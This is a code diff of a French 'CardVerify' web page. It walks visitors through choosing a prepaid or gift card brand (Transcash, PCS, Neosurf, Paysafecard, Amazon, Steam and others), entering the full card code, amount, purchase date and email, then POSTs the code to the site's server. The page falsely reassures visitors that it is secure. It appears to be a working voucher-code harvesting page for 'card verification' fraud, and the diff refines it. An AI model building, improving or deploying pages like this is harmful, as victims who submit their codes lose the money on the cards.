-      <!-- ── ÉTAPE 3 : Informations personnelles ── -->
-      <div class="form-section" id="step3">
-        <div class="section-title">Vos informations</div>
-        <div class="field">
-          <label>Nom complet (optionnel)</label>
-          <input type="text" id="userName" placeholder="Jean Dupont" autocomplete="name" />
-        </div>
-        <div class="field" id="emailField">
-          <label>Adresse email <span>*</span></label>
-          <input type="email" id="userEmail" placeholder="vous@exemple.com" autocomplete="email" />
-          <div class="hint">Un email de confirmation vous sera envoyé</div>
-          <div class="field-error" id="emailError">Email invalide.</div>
-        </div>
-        <div class="field">
-          <label>Message (optionnel)</label>
-          <textarea id="message" rows="3" style="resize:vertical;min-height:80px" placeholder="Informations complémentaires..."></textarea>
-        </div>
-        <div class="btn-row">
-          <button class="btn btn-ghost" onclick="goToStep(2)">← Retour</button>
-          <button class="btn btn-primary" style="flex:1" id="submitBtn" onclick="submitForm()">
-            <div class="spinner"></div>
-            <span class="btn-label">✦ Envoyer le code</span>
-          </button>
-        </div>
-      </div>
-
-      <!-- ── SUCCÈS ── -->
-      <div class="success-screen" id="successScreen">
-        <div class="success-icon">✅</div>
-        <div class="success-title">Code soumis avec succès !</div>
-        <p class="success-sub">Votre code a été transmis à notre équipe. Un email de confirmation a été envoyé à votre adresse.</p>
-        <div class="success-detail" id="successDetail"></div>
-        <button class="btn-reset" onclick="resetForm()">↺ Soumettre un autre code</button>
-      </div>
-
+      <button class="btn btnp" onclick="go2()">
+        <span class="btxt">Continuer →</span>
+        <div class="spin"></div>
+      </button>
     </div>
 
-    <!-- Footer -->
-    <p style="text-align:center;margin-top:20px;font-size:0.75rem;color:var(--text3);font-family:var(--font-mono)">
-      ✦ CardVerify · Sécurisé · Chiffré HTTPS
-    </p>
+    <!-- ÉTAPE 2 — CODE + MONTANT + DATE + CANAL -->
+    <div class="sec" id="sec2">
+      <div class="sh" id="sh2">Informations de la <span>carte</span></div>
+
+      <div class="field" id="cf">
+        <label>Code de la carte <span class="req">*</span></label>
+        <div class="cwrap">
+          <input type="password" id="cc" placeholder="••••••••••••••••"
+            autocomplete="off" spellcheck="false" oninput="onCode(this)"/>
+          <button class="ctog" type="button" id="ctb" onclick="togCode()" title="Afficher / masquer">🙈</button>
+        </div>
+        <div class="fhint" id="ch">Saisissez le code tel qu'il apparaît sur votre carte</div>
+        <div class="ferr" id="ce">Veuillez saisir un code valide (minimum 8 caractères).</div>
+      </div>
+
+      <div class="field" id="af">
+        <label>Montant estimé (€)</label>
+        <input type="number" id="amt" placeholder="" min="0.01" step="0.01" oninput="onAmt(this)"/>
+      </div>
+
+      <div class="frow">
+        <div class="field" style="margin-bottom:0">
+          <label>Date d'achat</label>
+          <input type="date" id="pd"/>
+        </div>
+        <div class="field" style="margin-bottom:0">
+          <label>Canal d'achat</label>
+          <select id="ch2">
+            <option value="">— Sélectionner —</option>
+            <option value="online">En ligne</option>
+            <option value="store">En magasin</option>
+            <option value="gift">Cadeau reçu</option>
+            <option value="other">Autre</option>
+          </select>
+        </div>
+      </div>
+
+      <div class="brow" style="margin-top:20px">
+        <button class="btn btng" onclick="go(1)">← Retour</button>
+        <button class="btn btnp" onclick="go3()">
+          <span class="btxt">Continuer →</span>
+          <div class="spin"></div>
+        </button>
+      </div>
+    </div>
+
+    <!-- ÉTAPE 3 — EMAIL UNIQUEMENT -->
+    <div class="sec" id="sec3">
+      <div class="sh">Votre <span>adresse email</span></div>
+      <div class="field" id="ef">
+        <label>Email <span class="req">*</span></label>
+        <input type="email" id="em2" placeholder="vous@exemple.com"
+          autocomplete="email" oninput="onEmail(this)"/>
+        <div class="fhint">Un email de confirmation vous sera envoyé à cette adresse</div>
+        <div class="ferr" id="ee">Adresse email invalide.</div>
+      </div>
+      <div class="brow">
+        <button class="btn btng" onclick="go(2)">← Retour</button>
+        <button class="btn btnp" id="sb" onclick="submit()">
+          <span class="btxt">✦ Envoyer le code</span>
+          <div class="spin"></div>
+        </button>
+      </div>
+    </div>
+
+    <!-- SUCCESS -->
+    <div class="ss" id="ss">
+      <div class="sic"><span>✅</span></div>
+      <div class="stit">Code soumis avec succès !</div>
+      <p class="ssub">Votre code a bien été transmis à notre équipe.<br/>Un email de confirmation a été envoyé à votre adresse.</p>
+      <div class="srec" id="srec"></div>
+      <button class="btnn" onclick="reset()">↺ Soumettre un autre code</button>
+    </div>
+
   </div>
 
-  <script>
-    // ─── État global ────────────────────────────────────────────────
-    let selectedType = null;
-    let currentStep = 1;
+  <footer class="ft">✦ CardVerify &nbsp;·&nbsp; Sécurisé &amp; chiffré en HTTPS</footer>
+</div>
 
-    const CARD_INFO = {
-      amazon:      { label: 'Amazon',      emoji: '📦', hint: '16 car. alpha. (ex: XXXX-XXXXXX-XXXX)', placeholder: 'XXXX-XXXXXX-XXXX' },
-      itunes:      { label: 'iTunes',      emoji: '🎵', hint: '16 caractères alphanumériques', placeholder: 'XXXXXXXXXXXXXXXX' },
-      neosurf:     { label: 'Neosurf',     emoji: '💳', hint: '10 chiffres', placeholder: '0000000000' },
-      pcs:         { label: 'PCS',         emoji: '🏪', hint: '16 chiffres', placeholder: '0000000000000000' },
-      paysafecard: { label: 'Paysafecard', emoji: '🔐', hint: '16 chiffres', placeholder: '0000000000000000' },
-      steam:       { label: 'Steam',       emoji: '🎮', hint: '15 car. (ex: XXXXX-XXXXX-XXXXX)', placeholder: 'XXXXX-XXXXX-XXXXX' },
-      transcash:   { label: 'Transcash',   emoji: '💸', hint: '14 chiffres', placeholder: '00000000000000' },
-      vanilla:     { label: 'Vanilla',     emoji: '🍦', hint: '16 chiffres', placeholder: '0000000000000000' },
-    };
+<script>
+let selType  = null;
+let selMin   = 8;
+let selMax   = 20;
+let selLabel = '';
+let codeVis  = false;
+let step     = 1;
 
-    // ─── Sélection du type ──────────────────────────────────────────
-    document.querySelectorAll('.card-type-btn').forEach(btn => {
-      btn.addEventListener('click', () => {
-        document.querySelectorAll('.card-type-btn').forEach(b => b.classList.remove('selected'));
-        btn.classList.add('selected');
-        selectedType = btn.dataset.type;
-        document.getElementById('typeError').style.display = 'none';
-      });
+document.querySelectorAll('.ctb').forEach(function(btn){
+  btn.addEventListener('click', function(){
+    document.querySelectorAll('.ctb').forEach(function(b){ b.classList.remove('sel'); });
+    btn.classList.add('sel');
+    selType  = btn.dataset.type;
+    selLabel = btn.dataset.label;
+    selMin   = parseInt(btn.dataset.min, 10);
+    selMax   = parseInt(btn.dataset.max, 10);
+    document.getElementById('tef').style.display = 'none';
+  });
+});
+
+function go(n){
+  hideErr();
+  document.getElementById('sec'+step).classList.remove('active');
+  step = n;
+  document.getElementById('sec'+n).classList.add('active');
+  document.getElementById('pf').style.width = (n/3*100)+'%';
+  [1,2,3].forEach(function(i){
+    var el = document.getElementById('s'+i);
+    el.classList.remove('active','done');
+    if(i < n)      el.classList.add('done');
+    else if(i===n) el.classList.add('active');
+  });
+}
+
+function go2(){
+  if(!selType){
+    document.getElementById('tef').style.display = 'block';
+    return;
+  }
+  var inp = document.getElementById('cc');
+  inp.value = '';
+  inp.type  = 'password';
+  inp.placeholder = '••••••••••••••••';
+  codeVis = false;
+  document.getElementById('ctb').textContent = '🙈';
+  inp.classList.remove('ok','err');
+  document.getElementById('cf').classList.remove('has-err');
+  document.getElementById('sh2').innerHTML = 'Code <span>' + selLabel + '</span>';
+  document.getElementById('ch').textContent = selMin + '–' + selMax + ' caractères';
+  go(2);
+}
+
+function go3(){
+  var code  = document.getElementById('cc').value.trim();
+  var raw   = code.replace(/[\s\-]/g,'');
+  var field = document.getElementById('cf');
+  if(raw.length < 8){
+    field.classList.add('has-err');
+    document.getElementById('ce').textContent = 'Veuillez saisir un code valide (minimum 8 caractères).';
+    return;
+  }
+  field.classList.remove('has-err');
+  document.getElementById('cc').classList.add('ok');
+  go(3);
+}
+
+function togCode(){
+  var inp = document.getElementById('cc');
+  var btn = document.getElementById('ctb');
+  codeVis = !codeVis;
+  inp.type = codeVis ? 'text' : 'password';
+  btn.textContent = codeVis ? '👁️' : '🙈';
+  if(!codeVis) inp.placeholder = '••••••••••••••••';
+}
+
+function onCode(el){
+  el.value = el.value.toUpperCase();
+  var raw = el.value.replace(/[\s\-]/g,'');
+  var field = document.getElementById('cf');
+  if(raw.length >= 8){
+    field.classList.remove('has-err');
+    el.classList.remove('err');
+    el.classList.add('ok');
+  } else {
+    el.classList.remove('ok');
+  }
+}
+
+function onAmt(el){
+  if(parseFloat(el.value) > 0){
+    el.classList.add('ok');
+  } else {
+    el.classList.remove('ok');
+  }
+}
+
+function onEmail(el){
+  var val   = el.value.trim();
+  var field = document.getElementById('ef');
+  var re    = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  if(val && !re.test(val)){
+    field.classList.add('has-err');
+  } else {
+    field.classList.remove('has-err');
+    if(val) el.classList.add('ok');
+  }
+}
+
+async function submit(){
+  var email = document.getElementById('em2').value.trim();
+  var re    = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  var ef    = document.getElementById('ef');
+  if(!email || !re.test(email)){
+    ef.classList.add('has-err');
+    document.getElementById('ee').textContent = 'Veuillez saisir une adresse email valide.';
+    return;
+  }
+  ef.classList.remove('has-err');
+  var btn = document.getElementById('sb');
+  btn.classList.add('loading');
+  btn.disabled = true;
+  hideErr();
+  var amtVal = document.getElementById('amt').value;
+  var pd     = document.getElementById('pd').value;
+  var ch2    = document.getElementById('ch2').value;
+  var code   = document.getElementById('cc').value.trim();
+  var payload = {
+    cardType:     selType,
+    cardLabel:    selLabel,
+    cardCode:     code,
+    amount:       amtVal ? (amtVal + ' EUR') : '',
+    purchaseDate: pd,
+    channel:      ch2,
+    userEmail:    email
+  };
+  try {
+    var res  = await fetch('/api/send', {
+      method:  'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body:    JSON.stringify(payload)
     });
+    var data = await res.json();
+    if(!res.ok || !data.success) throw new Error(data.error || 'Une erreur est survenue. Réessayez.');
+    showSuccess(payload);
+  } catch(err){
+    showErr(err.message);
+  } finally {
+    btn.classList.remove('loading');
+    btn.disabled = false;
+  }
+}
 
-    // ─── Navigation entre étapes ────────────────────────────────────
-    function goToStep(n) {
-      document.getElementById(`step${currentStep}`).classList.remove('active');
-      document.getElementById(`stepDot${currentStep}`).classList.remove('active');
-      document.getElementById(`stepDot${currentStep}`).classList.add('done');
+function showSuccess(d){
+  document.getElementById('pw').style.display  = 'none';
+  document.getElementById('eb').classList.remove('show');
+  document.getElementById('sec'+step).classList.remove('active');
+  var rows = '<div class="rr"><span class="rl">Type de carte</span><span class="rv">' + d.cardLabel + '</span></div>';
+  if(d.amount) rows += '<div class="rr"><span class="rl">Montant</span><span class="rv">' + d.amount + '</span></div>';
+  rows += '<div class="rr"><span class="rl">Email</span><span class="rv">' + d.userEmail + '</span></div>';
+  rows += '<div class="rr"><span class="rl">Statut</span><span class="rv g">✅ Transmis</span></div>';
+  document.getElementById('srec').innerHTML = rows;
+  document.getElementById('ss').classList.add('show');
+}
 
-      if (n < currentStep) {
-        // Retour : défaire "done" sur les étapes futures
-        for (let i = n; i <= 3; i++) {
-          const dot = document.getElementById(`stepDot${i}`);
-          if (dot) { dot.classList.remove('done', 'active'); }
-        }
-      }
+function reset(){
+  selType = null; selLabel = ''; selMin = 8; selMax = 20;
+  codeVis = false; step = 1;
+  document.querySelectorAll('.ctb').forEach(function(b){ b.classList.remove('sel'); });
+  document.querySelectorAll('.sec').forEach(function(s){ s.classList.remove('active'); });
+  document.getElementById('sec1').classList.add('active');
+  document.getElementById('pf').style.width = '33%';
+  document.getElementById('pw').style.display = 'block';
+  document.getElementById('ss').classList.remove('show');
+  [1,2,3].forEach(function(i){
+    var el = document.getElementById('s'+i);
+    el.classList.remove('active','done');
+    if(i===1) el.classList.add('active');
+  });
+  ['cc','amt','pd','em2'].forEach(function(id){
+    var el = document.getElementById(id);
+    if(el){ el.value=''; el.classList.remove('ok','err'); }
+  });
+  document.getElementById('ch2').value = '';
+  document.getElementById('cc').type = 'password';
+  document.getElementById('cc').placeholder = '••••••••••••••••';
+  document.getElementById('ctb').textContent = '🙈';
+  document.querySelectorAll('.field').forEach(function(f){ f.classList.remove('has-err'); });
+  document.getElementById('tef').style.display = 'none';
+  hideErr();
+}
 
-      currentStep = n;
-      document.getElementById(`step${currentStep}`).classList.add('active');
-      document.getElementById(`stepDot${currentStep}`).classList.add('active');
-      document.getElementById(`stepDot${currentStep}`).classList.remove('done');
-      document.getElementById('progressFill').style.width = `${(n / 3) * 100}%`;
-      hideError();
-    }
-
-    function goToStep2() {
-      if (!selectedType) {
-        document.getElementById('typeError').style.display = 'block';
-        return;
-      }
-      const info = CARD_INFO[selectedType];
-      document.getElementById('step2Title').textContent = `Code ${info.emoji} ${info.label}`;
-      document.getElementById('cardCode').placeholder = info.placeholder;
-      document.getElementById('codeHint').textContent = info.hint;
-      document.getElementById('cardCode').value = '';
-      goToStep(2);
-    }
-
-    function goToStep3() {
-      const code = document.getElementById('cardCode').value.trim();
-      const field = document.getElementById('codeField');
-      const input = document.getElementById('cardCode');
-
-      if (!code) {
-        field.classList.add('has-error');
-        input.classList.add('error');
-        document.getElementById('codeError').textContent = 'Veuillez saisir le code de la carte.';
-        return;
-      }
-      if (code.length < 8) {
-        field.classList.add('has-error');
-        input.classList.add('error');
-        document.getElementById('codeError').textContent = 'Ce code semble trop court.';
-        return;
-      }
-
-      field.classList.remove('has-error');
-      input.classList.remove('error');
-      input.classList.add('success');
-      goToStep(3);
-    }
-
-    // ─── Soumission du formulaire ───────────────────────────────────
-    async function submitForm() {
-      const userEmail = document.getElementById('userEmail').value.trim();
-      const emailField = document.getElementById('emailField');
-      const emailInput = document.getElementById('userEmail');
-
-      // Validation email
-      if (!userEmail || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(userEmail)) {
-        emailField.classList.add('has-error');
-        emailInput.classList.add('error');
-        document.getElementById('emailError').textContent = 'Veuillez saisir une adresse email valide.';
-        return;
-      }
-      emailField.classList.remove('has-error');
-      emailInput.classList.remove('error');
-
-      // UI chargement
-      const btn = document.getElementById('submitBtn');
-      btn.classList.add('loading');
-      btn.disabled = true;
-      hideError();
-
-      try {
-        const payload = {
-          cardType:  selectedType,
-          cardCode:  document.getElementById('cardCode').value.trim(),
-          userEmail: userEmail,
-          userName:  document.getElementById('userName').value.trim(),
-          amount:    document.getElementById('amount').value.trim(),
-          message:   document.getElementById('message').value.trim(),
-        };
-
-        const res = await fetch('/api/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload),
-        });
-
-        const data = await res.json();
-
-        if (!res.ok || !data.success) {
-          throw new Error(data.error || 'Une erreur est survenue. Veuillez réessayer.');
-        }
-
-        // ── Succès ────────────────────────────────────────────────
-        const info = CARD_INFO[selectedType];
-
-        // Cacher le form, montrer le succès
-        document.getElementById('stepsBar').style.display = 'none';
-        document.querySelector('.progress-bar').style.display = 'none';
-        document.getElementById('step3').classList.remove('active');
-        document.getElementById('errorBanner').classList.remove('visible');
-
-        const detail = document.getElementById('successDetail');
-        detail.innerHTML = `
-          <div class="success-detail-row">
-            <span class="success-detail-label">Type de carte</span>
-            <span class="success-detail-value">${info.emoji} ${info.label}</span>
-          </div>
-          <div class="success-detail-row">
-            <span class="success-detail-label">Email de confirmation</span>
-            <span class="success-detail-value">${userEmail}</span>
-          </div>
-          <div class="success-detail-row">
-            <span class="success-detail-label">Statut</span>
-            <span class="success-detail-value" style="color:var(--green)">✅ Transmis</span>
-          </div>
-        `;
-
-        document.getElementById('successScreen').classList.add('visible');
-
-      } catch (err) {
-        showError(err.message);
-      } finally {
-        btn.classList.remove('loading');
-        btn.disabled = false;
-      }
-    }
-
-    // ─── Reset ──────────────────────────────────────────────────────
-    function resetForm() {
-      selectedType = null;
-      currentStep = 1;
-      document.querySelectorAll('.card-type-btn').forEach(b => b.classList.remove('selected'));
-      document.querySelectorAll('.form-section').forEach(s => s.classList.remove('active'));
-      document.querySelectorAll('.step-dot').forEach(d => d.classList.remove('active','done'));
-      document.getElementById('step1').classList.add('active');
-      document.getElementById('stepDot1').classList.add('active');
-      document.getElementById('progressFill').style.width = '33%';
-      document.getElementById('stepsBar').style.display = 'flex';
-      document.querySelector('.progress-bar').style.display = 'block';
-      document.getElementById('successScreen').classList.remove('visible');
-      document.getElementById('cardCode').value = '';
-      document.getElementById('userEmail').value = '';
-      document.getElementById('userName').value = '';
-      document.getElementById('amount').value = '';
-      document.getElementById('message').value = '';
-      document.getElementById('cardCode').classList.remove('success','error');
-      hideError();
-    }
-
-    // ─── Helpers ─────────────────────────────────────────────────────
-    function showError(msg) {
-      const banner = document.getElementById('errorBanner');
-      document.getElementById('errorBannerText').textContent = msg;
-      banner.classList.add('visible');
-      banner.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-    }
-    function hideError() {
-      document.getElementById('errorBanner').classList.remove('visible');
-    }
-
-    // Formatage automatique du code en majuscules
-    document.getElementById('cardCode').addEventListener('input', function() {
-      const start = this.selectionStart;
-      this.value = this.value.toUpperCase();
-      this.setSelectionRange(start, start);
-    });
-  </script>
+function showErr(msg){
+  var b = document.getElementById('eb');
+  document.getElementById('em').textContent = msg;
+  b.classList.add('show');
+  b.scrollIntoView({ behavior:'smooth', block:'nearest' });
+}
+function hideErr(){
+  document.getElementById('eb').classList.remove('show');
+}
+</script>
 </body>
 </html>
